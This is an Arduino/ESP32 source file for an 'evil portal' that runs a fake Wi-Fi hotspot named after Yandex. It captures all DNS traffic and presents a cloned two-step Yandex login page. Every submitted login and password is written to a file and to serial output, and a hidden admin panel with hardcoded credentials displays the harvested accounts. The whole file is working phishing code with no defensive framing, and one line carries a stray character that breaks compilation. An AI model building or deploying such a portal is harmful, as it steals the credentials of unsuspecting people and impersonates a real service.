// for admin panel you need login with login: admin password: adminpass and do this in automatic opened admin page

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <esp_system.h>

// ==================== НАСТРОЙКИ ====================
const char* AP_SSID        = "Яндекс сети";
const char* ADMIN_PATH     = "/admin";
const char* LOG_FILE       = "/yandex_creds.txt";
const byte  DNS_PORT       = 53;

const char* ADMIN_LOGIN    = "admin";
const char* ADMIN_PASSWORD = "adminpass";

const char* COOKIE_NAME    = "rocket_auth";


String SESSION_TOKEN = "";

IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer server(80);

// ==================== ШАГ 1: ЛОГИН ====================
const char* PAGE_LOGIN = R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Авторизация</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
background:#fff;color:#000;display:flex;justify-content:center;align-items:flex-start;
min-height:100vh;padding:44px 20px 20px}
.wrap{width:100%;max-width:360px}
.logo{text-align:center;margin-bottom:28px}
.logo .ya{display:inline-block;font-family:'YS Text','Yandex Sans Text','Helvetica Neue',Arial,sans-serif;
font-size:34px;font-weight:700;letter-spacing:-1.2px;color:#fc3f1d;line-height:1}
h1{font-size:22px;font-weight:500;margin-bottom:6px;letter-spacing:-0.2px}
.sub{font-size:13px;color:#666;margin-bottom:26px;line-height:1.4}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#555;margin-bottom:5px;font-weight:500}
.field input{width:100%;padding:13px 14px;font-size:16px;border:1px solid #d0d0d0;
border-radius:8px;outline:none;background:#fff;transition:border-color .15s;-webkit-appearance:none}
.field input:focus{border-color:#fc0;box-shadow:0 0 0 1px rgba(252,204,0,.25)}
.field input::placeholder{color:#aaa;font-size:15px}
.btn{width:100%;padding:13px;font-size:15px;font-weight:500;background:#fc0;color:#000;
border:none;border-radius:8px;cursor:pointer;margin-top:8px;transition:background .15s}
.btn:active{background:#e6b800}
.foot{margin-top:22px;font-size:11px;color:#999;text-align:center;line-height:1.5}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo"><span class="ya">Яндекс</span></div>
  <h1>Вход в аккаунт</h1>
  <p class="sub">Войдите, чтобы продолжить использование сервисов</p>
  <form action="/step2" method="POST">
    <div class="field">
      <label for="login">Логин или email</label>
      <input type="text" id="login" name="login" placeholder="example@yandex.ru"
             autocomplete="username" autocapitalize="off" spellcheck="false" required>
    </div>
    <button type="submit" class="btn">Далее</button>
  </form>
  <div class="foot">Продолжая, вы соглашаетесь с условиями сервиса.</div>
</div>
</body>
</html>
)rawliteral";

// ==================== ШАГ 2: ПАРОЛЬ ====================
const char* PAGE_PASSWORD = R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Авторизация</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
background:#fff;color:#000;display:flex;justify-content:center;align-items:flex-start;
min-height:100vh;padding:44px 20px 20px}
.wrap{width:100%;max-width:360px}
.logo{text-align:center;margin-bottom:28px}
.logo .ya{display:inline-block;font-family:'YS Text','Yandex Sans Text','Helvetica Neue',Arial,sans-serif;
font-size:34px;font-weight:700;letter-spacing:-1.2px;color:#fc3f1d;line-height:1}
h1{font-size:22px;font-weight:500;margin-bottom:6px;letter-spacing:-0.2px}
.sub{font-size:13px;color:#666;margin-bottom:26px;line-height:1.4}
.user{font-size:15px;font-weight:500;margin-bottom:22px;color:#000}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#555;margin-bottom:5px;font-weight:500}
.field input{width:100%;padding:13px 14px;font-size:16px;border:1px solid #d0d0d0;
border-radius:8px;outline:none;background:#fff;transition:border-color .15s;-webkit-appearance:none}
.field input:focus{border-color:#fc0;box-shadow:0 0 0 1px rgba(252,204,0,.25)}
.field input::placeholder{color:#aaa;font-size:15px}
.btn{width:100%;padding:13px;font-size:15px;font-weight:500;background:#fc0;color:#000;
border:none;border-radius:8px;cursor:pointer;margin-top:8px;transition:background .15s}
.btn:active{background:#e6b800}
.link{display:block;text-align:center;margin-top:16px;font-size:13px;color:#666;text-decoration:none}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo"><span class="ya">Яндекс</span></div>
  <h1>Введите пароль</h1>
  <div class="user" id="user">%LOGIN%</div>
  <form action="/login" method="POST">
    <input type="hidden" name="login" value="%LOGIN%">
    <div class="field">
      <label for="password">Пароль</label>
      <input type="password" id="password" name="password" placeholder="Пароль"
             autocomplete="current-password" required>
    </div>
    <button type="submit" class="btn">Войти</button>
  </form>
  <a class="link" href="#">Забыли пароль?</a>
</div>
</body>
</html>
)rawliteral";

// ==================== СТРАНИЦА ОШИБКИ ====================
const char* PAGE_ERROR = R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Авторизация</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
body{background:#fff;padding:44px 20px}
.wrap{max-width:360px;margin:0 auto}
.logo{text-align:center;margin-bottom:24px}
.logo .ya{font-family:'YS Text','Yandex Sans Text','Helvetica Neue',Arial,sans-serif;
font-size:30px;font-weight:700;letter-spacing:-1.2px;color:#fc3f1d}
h1{font-size:20px;margin-bottom:10px}
.err{color:#d00;font-size:14px;margin-bottom:18px;line-height:1.4}
a{color:#666;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo"><span class="ya">Яндекс</span></div>
  <h1>Неверный пароль</h1>
  <p class="err">Попробуйте снова или восстановите доступ.</p>
  <a href="/">← Вернуться к входу</a>
</div>
</body>
</html>
)rawliteral";

// ==================== ФОРМА ВХОДА В АДМИНКУ ====================
const char* PAGE_ADMIN_LOGIN = R"rawliteral(
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ROCKET Admin — Вход</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
body{background:#0f0f0f;color:#e0e0e0;display:flex;justify-content:center;align-items:center;
min-height:100vh;padding:20px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;padding:28px;width:100%;max-width:340px}
h1{font-size:18px;color:#fc3f1d;margin-bottom:6px}
.sub{font-size:12px;color:#888;margin-bottom:22px}
.err{color:#ff6b6b;font-size:13px;margin-bottom:14px;text-align:center;
background:#2a1010;border:1px solid #5a2020;border-radius:6px;padding:8px}
.field{margin-bottom:14px}
label{display:block;font-size:12px;color:#aaa;margin-bottom:5px}
input{width:100%;padding:11px 13px;font-size:15px;background:#0f0f0f;border:1px solid #333;
border-radius:7px;color:#e0e0e0;outline:none;transition:border-color .15s}
input:focus{border-color:#fc3f1d}
.btn{width:100%;padding:12px;font-size:14px;font-weight:500;background:#fc3f1d;color:#fff;
border:none;border-radius:7px;cursor:pointer;margin-top:6px}
.btn:active{background:#d9351a}
</style>
</head>
<body>
<div class="card">
  <h1>ROCKET Admin</h1>
  <p class="sub">Введите логин и пароль для доступа</p>
  %ERROR%
  <form action="/admin-login" method="POST">
    <div class="field">
      <label for="u">Логин</label>
      <input type="text" id="u" name="u" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="p">Пароль</label>
      <input type="password" id="p" name="p" autocomplete="current-password" required>
    </div>
    <button type="submit" class="btn">Войти</button>
  </form>
</div>
</body>
</html>
)rawliteral";

// ==================== ПАНЕЛЬ АДМИНКИ ====================
const char* PAGE_ADMIN_PANEL = R"rawliteral(
<!DOCTYPE html><html lang="ru"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ROCKET Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
body{background:#0f0f0f;color:#e0e0e0;padding:16px;min-height:100vh}
h1{font-size:18px;margin-bottom:12px;color:#fc3f1d}
.bar{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
button{background:#1e1e1e;color:#e0e0e0;border:1px solid #333;padding:8px 16px;
border-radius:6px;font-size:13px;cursor:pointer}
button:hover{background:#2a2a2a}
button.danger{border-color:#5a2020;color:#ff6b6b}
button.danger:hover{background:#2a1010}
pre{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:14px;
font-size:12px;line-height:1.6;overflow-x:auto;white-space:pre-wrap;word-break:break-all;
font-family:ui-monospace,Consolas,monospace;color:#c8c8c8;min-height:200px}
.count{font-size:12px;color:#888;margin-bottom:8px}
</style></head><body>
<h1>ROCKET // Yandex Portal Admin</h1>
<div class="bar">
  <button onclick="load()">Обновить</button>
  <button class="danger" onclick="clearLog()">Очистить лог</button>
</div>
<div class="count" id="cnt">Загрузка...</div>
<pre id="out">...</pre>
<script>
const TOKEN = new URLSearchParams(location.search).get('t') || '';
async function load(){
  try{
    const r = await fetch('/api/logs?t=' + TOKEN, {credentials:'same-origin'});
    const t = await r.text();
    const lines = t.trim().split('\n').filter(l=>l.length>0);
    document.getElementById('cnt').textContent = 'Записей: ' + lines.length;
    document.getElementById('out').textContent = t || '(пусто)';
  }catch(e){ document.getElementById('out').textContent = 'Ошибка: '+e; }
}
async function clearLog(){
  if(!confirm('Удалить все записи?')) return;
  await fetch('/api/clear?t=' + TOKEN, {method:'POST', credentials:'same-origin'});
  load();
}
load();
</script></body></html>
)rawliteral";

void appendToLog(const String& line) {
    File f = SPIFFS.open(LOG_FILE, FILE_APPEND);
    if (f) { f.println(line); f.close(); }
}

String readLog() {
    if (!SPIFFS.exists(LOG_FILE)) return "(файл не создан)";
    File f = SPIFFS.open(LOG_FILE, FILE_READ);
    if (!f) return "(ошибка чтения)";
    String s = f.readString();
    f.close();
    return s.length() ? s : "(пусто)";
}

void clearLog() {
    File f = SPIFFS.open(LOG_FILE, FILE_WRITE);
    if (f) f.close();
}

String buildPasswordPage(const String& login) {
    String page = String(PAGE_PASSWORD);
    page.replace("%LOGIN%", login);
    return page;
}


bool isAdmin() {
    if (server.hasArg("t") && server.arg("t") == SESSION_TOKEN) return true;

    String cookie = "";
    if (server.hasHeader("Cookie")) cookie = server.header("Cookie");
    if (cookie.length() == 0 && server.hasHeader("cookie")) cookie = server.header("cookie");
    if (cookie.length() > 0 &&
        cookie.indexOf(String(COOKIE_NAME) + "=" + SESSION_TOKEN) >= 0) return true;

    return false;
}

String buildAdminLogin(bool showError) {
    String page = String(PAGE_ADMIN_LOGIN);
    if (showError) {
        page.replace("%ERROR%",
            "<div class=\"err\">Неверный логин или пароль</div>");
    } else {
        page.replace("%ERROR%", "");
    }
    return page;
}


String generateToken() {
    char buf[33];
    for (byte i = 0; i < 16; i++) {
        sprintf(buf + i * 2, "%02x", (byte)(esp_random() & 0xFF));
    }
    buf[32] = '\0';
    return String(buf);
}

// ==================== HTTP ОБРАБОТЧИКИ ====================
void handleRoot() {
    server.send(200, "text/html; charset=utf-8", PAGE_LOGIN);
}

void handleStep2() {
    String login = server.hasArg("login") ? server.arg("login") : "";
    if (login.length() == 0) {
        server.sendHeader("Location", "http://" + apIP.toString(), true);
        server.send(302, "text/plain", "");
        return;
    }
    server.send(200, "text/html; charset=utf-8", buildPasswordPage(login));
}

void handleLogin() {
    String login = server.hasArg("login") ? server.arg("login") : "";
    String pwd   = server.hasArg("password") ? server.arg("password") : "";

    if (login == ADMIN_LOGIN && pwd == ADMIN_PASSWORD) {
        Serial.println("[+] ADMIN LOGIN OK — редирект в /admin с токеном");
        String redirect = String("/admin?t=") + SESSION_TOKEN;
        server.sendHeader("Location", redirect, true);
        server.send(302, "text/plain", "");
        return;
    }

    bool valid = pwd.length() >= 6;
    if (!valid) {
        appendToLog("LOGIN: " + login + " | PASS: " + pwd + " | STATUS: INVALID_PASSWORD");
        server.send(200, "text/html; charset=utf-8", PAGE_ERROR);
        return;
    }

    char buf[256];
    snprintf(buf, sizeof(buf), "LOGIN: %s | PASS: %s | TIME: %lu",
             login.c_str(), pwd.c_str(), millis() / 1000);
    appendToLog(String(buf));

    Serial.println("[+] ПЕРЕХВАЧЕНО:");ж
    Serial.printf("    логин:  %s\n", login.c_str());
    Serial.printf("    пароль: %s\n", pwd.c_str());

    server.sendHeader("Location", "https://yandex.ru", true);
    server.send(302, "text/plain", "");
}

void handleAdmin() {
    if (!isAdmin()) {
        Serial.println("[admin] нет токена — показываю форму входа");
        server.send(200, "text/html; charset=utf-8", buildAdminLogin(false));
        return;
    }
    Serial.println("[admin] токен OK — показываю панель");
    server.send(200, "text/html; charset=utf-8", PAGE_ADMIN_PANEL);
}

void handleAdminLogin() {
    String u = server.hasArg("u") ? server.arg("u") : "";
    String p = server.hasArg("p") ? server.arg("p") : "";

    Serial.printf("[admin-login] u='%s' p='%s'\n", u.c_str(), p.c_str());

    if (u == ADMIN_LOGIN && p == ADMIN_PASSWORD) {
        Serial.println("[+] Пара верная — редирект на /admin с токеном");
       
        server.sendHeader("Set-Cookie",
            String(COOKIE_NAME) + "=" + SESSION_TOKEN + "; Path=/; Max-Age=86400");
        String redirect = String("/admin?t=") + SESSION_TOKEN;
        server.sendHeader("Location", redirect, true);
        server.send(302, "text/plain", "");
    } else {
        Serial.println("[!] Пара неверная");
        server.send(200, "text/html; charset=utf-8", buildAdminLogin(true));
    }
}

void handleApiLogs() {
    if (!isAdmin()) {
        server.send(401, "text/plain", "unauthorized");
        return;
    }
    server.send(200, "text/plain; charset=utf-8", readLog());
}

void handleApiClear() {
    if (!isAdmin()) {
        server.send(401, "text/plain", "unauthorized");
        return;
    }
    clearLog();
    server.send(200, "text/plain", "ok");
}

void handleNotFound() {
    server.sendHeader("Location", "http://" + apIP.toString(), true);
    server.send(302, "text/plain", "");
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(115200);
    delay(400);

    Serial.println("\n===== ROCKET Evil Portal v3 =====");
    Serial.printf("AP: %s\n", AP_SSID);

   
    SESSION_TOKEN = generateToken();
    Serial.printf("SESSION_TOKEN: %s\n", SESSION_TOKEN.c_str());

    Serial.printf("Admin login: %s\n", ADMIN_LOGIN);
    Serial.printf("Admin pass:  %s\n", ADMIN_PASSWORD);

    SPIFFS.begin(true);
    if (!SPIFFS.exists(LOG_FILE)) {
        File f = SPIFFS.open(LOG_FILE, FILE_WRITE);
        if (f) { f.println("# ROCKET // Yandex Credentials Log"); f.close(); }
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
    WiFi.softAP(AP_SSID);
    Serial.printf("IP: %s\n", WiFi.softAPIP().toString().c_str());

    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/",            HTTP_GET,  handleRoot);
    server.on("/step2",       HTTP_POST, handleStep2);
    server.on("/login",       HTTP_POST, handleLogin);
    server.on("/admin",       HTTP_GET,  handleAdmin);
    server.on("/admin-login", HTTP_POST, handleAdminLogin);
    server.on("/api/logs",    HTTP_GET,  handleApiLogs);
    server.on("/api/clear",   HTTP_POST, handleApiClear);

    server.on("/generate_204",        HTTP_GET, handleRoot);
    server.on("/hotspot-detect.html", HTTP_GET, handleRoot);
    server.on("/connecttest.txt",     HTTP_GET, handleRoot);
    server.on("/redirect",            HTTP_GET, handleRoot);

    server.onNotFound(handleNotFound);
    server.begin();

    Serial.printf("Админка: http://%s%s?t=%s\n\n",
                  apIP.toString().c_str(), ADMIN_PATH, SESSION_TOKEN.c_str());
}

// ==================== LOOP ====================
void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
    delay(1);
}